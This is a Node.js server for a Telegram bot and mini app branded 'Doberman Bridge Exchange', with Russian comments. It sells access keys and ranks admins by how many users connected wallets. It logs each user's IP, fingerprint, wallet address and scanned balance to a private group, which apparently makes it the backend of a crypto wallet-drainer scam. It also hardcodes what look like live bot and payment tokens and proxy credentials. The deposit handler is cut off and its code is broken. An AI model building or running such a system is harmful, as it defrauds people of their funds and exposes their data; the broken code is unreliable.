const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const { Telegraf, Markup } = require('telegraf');
const cors = require('cors');
const path = require('path');
const { execFile } = require('child_process'); // 👈 Безопасный модуль для вызова скриптов

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ================= НАСТРОЙКИ БОТА И ПРИЛОЖЕНИЯ =================
const BOT_TOKEN = process.env.BOT_TOKEN || '8888765718:AAHhxfET9RQsjcz4iAjZcr45smyLdCx2VFg'; // Смени токен в BotFather!
const CRYPTO_PAY_TOKEN = process.env.CRYPTO_PAY_TOKEN || '617581:AA7CQ0ohJPnfVTM42YAqdbQrkOWJS3nPQpQ'; // Смени токен в CryptoBot!
const LOG_GROUP_ID = '-1002499529465';          // Telegram ID группы для логов
const OWNER_ID = 1276684773;                    // Ваш Telegram ID
const WEBAPP_URL = 'https://handstand-quarterly-pushiness.ngrok-free.dev'; // HTTPS адрес WebApp
const PORT = process.env.PORT || 3000;
// ===============================================================
// Вместо старого require на строке 21 напишите вот так:
const HttpsProxyAgent = require('https-proxy-agent');

// 2. Правильный формат ссылки (Логин и Пароль строго в НАЧАЛЕ)
const proxyAgent = new HttpsProxyAgent('http://ZdHxsw:Eggspm@45.91.209.142:10122');

// 3. Передаем агент в параметр 'agent', а не 'apiRoot'!
const bot = new Telegraf(BOT_TOKEN, {
  telegram: {
    agent: proxyAgent
  }
});

// ================= БАЗЫ ДАННЫХ =================
const db1 = new sqlite3.Database('./admins_keys.db');
const db2 = new sqlite3.Database('./users.db');

db1.serialize(() => {
  db1.run(`CREATE TABLE IF NOT EXISTS admins (admin_id INTEGER PRIMARY KEY, role TEXT)`);
  db1.run(`CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, admin_id INTEGER, status DEFAULT 'active')`);
  db1.run(`INSERT OR IGNORE INTO admins (admin_id, role) VALUES (?, 'owner')`, [OWNER_ID]);
});

db2.serialize(() => {
  db2.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER UNIQUE,
    fingerprint TEXT,
    ip TEXT,
    admin_id INTEGER,
    key_used TEXT,
    wallet_address TEXT,
    wallet_type TEXT,
    wallet_balance TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
function isAdmin(tgId, callback) {
  if (tgId === OWNER_ID) return callback(true);
  db1.get(`SELECT * FROM admins WHERE admin_id = ?`, [tgId], (err, row) => callback(!!row));
}

async function sendLog(message) {
  try {
    if (LOG_GROUP_ID && LOG_GROUP_ID !== '-100XXXXXXX') {
      await bot.telegram.sendMessage(LOG_GROUP_ID, message, { parse_mode: 'HTML' });
    }
  } catch (err) {
    console.error('Log Error:', err.message);
  }
}

function getAdminStats() {
  return new Promise((resolve, reject) => {
    db1.all(`SELECT admin_id, role FROM admins`, [], async (err, admins) => {
      if (err) return reject(err);

      let results = [];
      for (const admin of admins) {
        const adminId = admin.admin_id;

        const keysCreated = await new Promise((res) => {
          db1.get(`SELECT COUNT(*) as cnt FROM keys WHERE admin_id = ?`, [adminId], (e, r) => res(r ? r.cnt : 0));
        });

        const keysUsed = await new Promise((res) => {
          db1.get(`SELECT COUNT(*) as cnt FROM keys WHERE admin_id = ? AND status = 'used'`, [adminId], (e, r) => res(r ? r.cnt : 0));
        });

        const walletsConnected = await new Promise((res) => {
          db2.get(
            `SELECT COUNT(*) as cnt FROM users WHERE admin_id = ? AND wallet_address IS NOT NULL AND wallet_address != ''`,
            [adminId],
            (e, r) => res(r ? r.cnt : 0)
          );
        });

        results.push({ adminId, role: admin.role, keysCreated, keysUsed, walletsConnected });
      }

      resolve(results);
    });
  });
}

// ================= ТЕЛЕГРАМ БОТ =================
bot.start(async (ctx) => {
  try {
    await ctx.telegram.setChatMenuButton({
      chat_id: ctx.chat.id,
      menu_button: { type: 'web_app', text: 'Doberman Bridge 🚀', web_app: { url: WEBAPP_URL } }
    });
  } catch (e) {}

  return ctx.reply(
    '🐺 <b>Welcome to Doberman Bridge Exchange!</b>\n\nPress the button below to launch the Mini App inside Telegram or buy an access key.',
    {
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([
        [Markup.button.webApp('🚀 Open Mini App', WEBAPP_URL)],
        [Markup.button.callback('🔑 Buy Key', 'buy_key')]
      ])
    }
  );
});

// Выбор способа оплаты
bot.action('buy_key', async (ctx) => {
  try {
    await ctx.answerCbQuery();
    await ctx.reply(
      '💳 <b>Select payment method:</b>',
      {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('💎 CryptoBot (USDT / TON / BTC)', 'pay_cryptobot')]
        ])
      }
    );
  } catch (e) {
    console.error(e);
  }
});

// Создание инвойса CryptoBot через кнопку
bot.action('pay_cryptobot', async (ctx) => {
  try {
    await ctx.answerCbQuery('Creating invoice...');
    const userId = ctx.from.id;
    const KEY_PRICE = '50';

    const response = await fetch('https://pay.crypt.bot/api/createInvoice', {
      method: 'POST',
      headers: {
        'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        asset: 'USDT',
        amount: KEY_PRICE,
        description: `Purchase Doberman Bridge Access Key`,
        payload: JSON.stringify({ userId, action: 'buy_key' }),
        paid_btn_name: 'openBot',
        paid_btn_url: WEBAPP_URL
      })
    });

    const data = await response.json();

    if (data.ok) {
      await ctx.reply(
        `🔑 <b>Access Key Purchase</b>\n\n` +
        `Amount due: <b>${KEY_PRICE} USDT</b>\n\n` +
        `Click the button below to pay instantly via CryptoBot:`,
        {
          parse_mode: 'HTML',
          ...Markup.inlineKeyboard([
            [Markup.button.url('💳 Pay via CryptoBot', data.result.pay_url)]
          ])
        }
      );
    } else {
      await ctx.reply('❌ Failed to create invoice. Please try again later.');
    }
  } catch (e) {
    console.error(e);
    await ctx.reply('❌ Connection error with CryptoBot.');
  }
});

// Команды администратора
bot.command('addadmin', (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply('⛔ Только Owner может добавлять админов.');

  const args = ctx.message.text.split(' ');
  const newAdminId = parseInt(args[1]);

  if (!newAdminId || isNaN(newAdminId)) {
    return ctx.reply('⚠️ Использование: <code>/addadmin 123456789</code>', { parse_mode: 'HTML' });
  }

  db1.run(`INSERT OR IGNORE INTO admins (admin_id, role) VALUES (?, 'admin')`, [newAdminId], (err) => {
    if (err) return ctx.reply('❌ Ошибка базы данных.');
    ctx.reply(`✅ Пользователь <code>${newAdminId}</code> назначен администратором!`, { parse_mode: 'HTML' });
  });
});

bot.command('admin', (ctx) => {
  isAdmin(ctx.from.id, (isAd) => {
    if (!isAd) return ctx.reply('⛔ Доступ запрещен.');
    ctx.reply(
      '👑 <b>Панель Администратора Doberman Bridge</b>',
      Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Сгенерировать ключ', 'cmd_genkey')],
        [Markup.button.callback('📊 Статистика', 'cmd_stats')],
        [Markup.button.callback('📋 Список админов', 'cmd_adminlist')]
      ])
    );
  });
});

bot.command('adminlist', (ctx) => handleAdminList(ctx));
bot.action('cmd_adminlist', (ctx) => handleAdminList(ctx));

function handleAdminList(ctx) {
  isAdmin(ctx.from.id, (isAd) => {
    if (!isAd) return ctx.reply('⛔ Доступ запрещен.');

    db1.all(`SELECT admin_id, role FROM admins`, [], (err, rows) => {
      if (err || !rows) return ctx.reply('❌ Ошибка чтения БД.');

      let text = '📋 <b>Список администраторов:</b>\n\n';
      rows.forEach((row, index) => {
        text += `${index + 1}. ID: <code>${row.admin_id}</code> | Роль: <b>${row.role}</b>\n`;
      });

      ctx.reply(text, { parse_mode: 'HTML' });
    });
  });
}

bot.command('stats', (ctx) => handleStats(ctx));
bot.action('cmd_stats', (ctx) => handleStats(ctx));

async function handleStats(ctx) {
  isAdmin(ctx.from.id, async (isAd) => {
    if (!isAd) return ctx.reply('⛔ Доступ запрещен.');

    try {
      const stats = await getAdminStats();
      let text = '📊 <b>Статистика по администраторам:</b>\n\n';

      stats.forEach((st) => {
        text += `👤 <b>Admin ID:</b> <code>${st.adminId}</code> (${st.role})\n`;
        text += ` ├ 🔑 Сгенерировано ключей: <b>${st.keysCreated}</b>\n`;
        text += ` ├ 🔐 Авторизовано (использовано): <b>${st.keysUsed}</b>\n`;
        text += ` └ 👛 Подключили кошелек: <b>${st.walletsConnected}</b>\n\n`;
      });

      ctx.reply(text, { parse_mode: 'HTML' });
    } catch (e) {
      console.error(e);
      ctx.reply('❌ Ошибка при формировании статистики.');
    }
  });
}

bot.command('genkey', (ctx) => handleGenKey(ctx));
bot.action('cmd_genkey', (ctx) => handleGenKey(ctx));

function handleGenKey(ctx) {
  const userId = ctx.from.id;
  isAdmin(userId, (isAd) => {
    if (!isAd) return ctx.reply('⛔ Нет прав.');
    const newKey = 'DOBERMAN-' + Math.random().toString(36).substring(2, 10).toUpperCase();

    db1.run(`INSERT INTO keys (key, admin_id, status) VALUES (?, ?, 'active')`, [newKey, userId], (err) => {
      if (err) return ctx.reply('❌ Ошибка БД.');
      ctx.reply(`✅ <b>Новый ключ создан:</b>\n\n<code>${newKey}</code>`, { parse_mode: 'HTML' });
    });
  });
}

// ================= EXPRESS API ENDPOINTS =================

// Проверка сессии
app.post('/api/check-session', (req, res) => {
  const { tgId, savedKey, fingerprint } = req.body;

  if (tgId) {
    return db2.get(`SELECT * FROM users WHERE tg_id = ?`, [tgId], (err, user) => {
      if (user && user.key_used) return res.json({ authorized: true, user });
      res.json({ authorized: false });
    });
  }

  if (savedKey || fingerprint) {
    return db2.get(`SELECT * FROM users WHERE key_used = ? OR fingerprint = ?`, [savedKey || '', fingerprint || ''], (err, user) => {
      if (user && user.key_used) return res.json({ authorized: true, user });
      res.json({ authorized: false });
    });
  }

  res.json({ authorized: false });
});

// Активация ключа
app.post('/api/verify-key', (req, res) => {
  const { key, fingerprint, tgUser } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const tgId = tgUser?.id || null;

  db1.get(`SELECT * FROM keys WHERE key = ? AND status = 'active'`, [key], (err, keyRow) => {
    if (err || !keyRow) {
      return res.status(400).json({ success: false, message: 'Invalid or already used key.' });
    }

    db1.run(`UPDATE keys SET status = 'used' WHERE key = ?`, [key]);

    db2.get(`SELECT * FROM users WHERE (tg_id = ? AND tg_id IS NOT NULL) OR fingerprint = ?`, [tgId, fingerprint], (err, existingUser) => {
      if (existingUser) {
        db2.run(
          `UPDATE users SET key_used = ?, admin_id = ?, tg_id = ?, ip = ? WHERE id = ?`,
          [key, keyRow.admin_id, tgId, clientIp, existingUser.id],
          () => sendAuthLog()
        );
      } else {
        db2.run(
          `INSERT INTO users (tg_id, fingerprint, ip, admin_id, key_used) VALUES (?, ?, ?, ?, ?)`,
          [tgId, fingerprint, clientIp, keyRow.admin_id, key],
          () => sendAuthLog()
        );
      }
    });

    function sendAuthLog() {
      const tgInfo = tgUser ? `\n👤 <b>TG:</b> @${tgUser.username || 'N/A'} (ID: <code>${tgUser.id}</code>)` : '';
      sendLog(
        `🔑 <b>NEW USER AUTHORIZED!</b>\n\n` +
        `▫️ <b>Key:</b> <code>${key}</code>\n` +
        `▫️ <b>Admin Owner ID:</b> <code>${keyRow.admin_id}</code>` +
        `${tgInfo}\n` +
        `▫️ <b>IP:</b> <code>${clientIp}</code>`
      );
      res.json({ success: true, adminId: keyRow.admin_id, key: key });
    }
  });
});

// Привязка кошелька
app.post('/api/connect-wallet', (req, res) => {
  const { walletAddress, walletType, balance, key, tgUser, fingerprint } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const tgId = tgUser?.id || null;

  db2.run(
    `UPDATE users SET wallet_address = ?, wallet_type = ?, wallet_balance = ? WHERE (tg_id = ? AND tg_id IS NOT NULL) OR key_used = ? OR fingerprint = ?`,
    [walletAddress, walletType, balance, tgId, key, fingerprint],
    function (err) {
      const tgInfo = tgUser ? `\n👤 <b>TG:</b> @${tgUser.username || 'N/A'} (ID: <code>${tgUser.id}</code>)` : '';

      sendLog(
        `💎 <b>WALLET CONNECTED!</b>\n\n` +
        `🌐 <b>Network:</b> ${walletType.toUpperCase()}\n` +
        `👛 <b>Address:</b> <code>${walletAddress}</code>\n` +
        `💰 <b>Scanned Balance:</b> <code>${balance}</code>\n` +
        `🔑 <b>User Key:</b> <code>${key || 'Existing User'}</code>` +
        `${tgInfo}\n` +
        `🌐 <b>IP:</b> <code>${clientIp}</code>`
      );

      res.json({ success: true });
    }
  );
});

// 🐍 Безопасный запуск Python-скрипта с защитой от Command Injection
app.post('/api/deposit', (req, res) => {
  const { tgUser } = req.body;
  const userId = tgUser?.id || null;

  if (!userId) {
    return res.status(400).json({ success: false, error: 'No user ID' });
  }

  console.log(`[Deposit Request] User: ${userId}`);

  db2.get(`SELECT wallet_address FROM users WHERE tg_id = ?`, [userId], (err, row) => {
    if (err || !row || !row.wallet_address) {
      console.error(`❌ No wallet found for user: ${userId}`);
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }

    const walletAddress = row.wallet_address;
    console.log(`✅ Found wallet: ${walletAddress}`);

    // Безопасный вызов через execFile вместо exec (защита от удаленного выполнения команд)
    
    });
  });


// Создание прямого инвойса CryptoBot
app.post('/api/create-invoice', async (req, res) => {
  const { amount, asset, tgUser } = req.body;
  const userId = tgUser?.id || 'unknown';

  try {
    const response = await fetch('https://pay.crypt.bot/api/createInvoice', {
      method: 'POST',
      headers: {
        'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        asset: asset || 'USDT',
        amount: amount || '10',
        description: `Direct deposit for User ID: ${userId}`,
        payload: JSON.stringify({ userId, action: 'direct_deposit' }),
        paid_btn_name: 'openBot',
        paid_btn_url: WEBAPP_URL
      })
    });

    const data = await response.json();

    if (data.ok) {
      res.json({ success: true, payUrl: data.result.pay_url });
    } else {
      res.status(400).json({ success: false, error: data.error });
    }
  } catch (err) {
    console.error('Invoice Creation Error:', err.message);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Единый Webhook для CryptoBot (Объединенный)
app.post('/api/crypto-webhook', (req, res) => {
  const { update_type, payload } = req.body;

  if (update_type === 'invoice_paid') {
    const invoice = payload;
    const customData = JSON.parse(invoice.payload || '{}');
    const userId = customData.userId;
    const action = customData.action;

    // Покупка ключа
    if (action === 'buy_key' && userId) {
      const newKey = 'DOBERMAN-' + Math.random().toString(36).substring(2, 10).toUpperCase();

      db1.run(`INSERT INTO keys (key, admin_id, status) VALUES (?, ?, 'active')`, [newKey, OWNER_ID], async (err) => {
        if (!err) {
          try {
            await bot.telegram.sendMessage(
              userId,
              `🎉 <b>Payment Successful!</b>\n\nYour access key:\n<code>${newKey}</code>\n\nEnter it in the Mini App to log in.`,
              { parse_mode: 'HTML' }
            );
          } catch (e) {
            console.error('Failed to send key to user:', e.message);
          }
        }
      });

      sendLog(
        `💸 <b>KEY PURCHASED VIA CRYPTOBOT!</b>\n\n` +
        `👤 <b>User ID:</b> <code>${userId}</code>\n` +
        `💰 <b>Amount:</b> <code>${invoice.amount} ${invoice.asset}</code>`
      );
    } 
    // Прямой депозит / покупка
    else {
      console.log(`✅ [PAYMENT SUCCESS] User: ${userId} paid ${invoice.amount} ${invoice.asset}`);

      sendLog(
        `💸 <b>DIRECT PURCHASE RECEIVED!</b>\n\n` +
        `👤 <b>User ID:</b> <code>${userId}</code>\n` +
        `💰 <b>Amount:</b> <code>${invoice.amount} ${invoice.asset}</code>\n` +
        `🆔 <b>Invoice ID:</b> <code>${invoice.invoice_id}</code>\n` +
        `Статус: <b>Оплачено ✅</b>`
      );
    }
  }

  res.sendStatus(200);
});

// ================= ЗАПУСК СЕРВЕРА И БОТА =================
bot.launch();
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));